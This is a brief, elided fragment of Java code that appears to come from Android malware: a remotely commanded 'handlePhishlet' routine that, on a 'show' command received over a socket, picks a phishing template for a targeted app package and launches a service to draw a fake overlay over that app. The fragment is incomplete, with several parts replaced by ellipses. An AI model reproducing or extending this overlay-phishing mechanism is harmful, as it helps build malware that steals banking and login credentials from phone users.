    ...
    private static void handlePhishlet(JSONObject data, Socket socket, String cmdId) {
        ...
        try {
            if (Protocol.ACT_PHISHLET_SHOW.equals(action)) {
                ...
                String template = PhishletManager.resolveTemplate(pkg);
                boolean persistent = PhishletManager.isPersistent(pkg);
                Intent intent = new Intent(ctx, OverlayService.class);
                intent.setAction("SHOW_OVERLAY");
                intent.putExtra(Protocol.KEY_OVERLAY_PACKAGE, pkg);
                intent.putExtra(Protocol.KEY_OVERLAY_TEMPLATE, template);
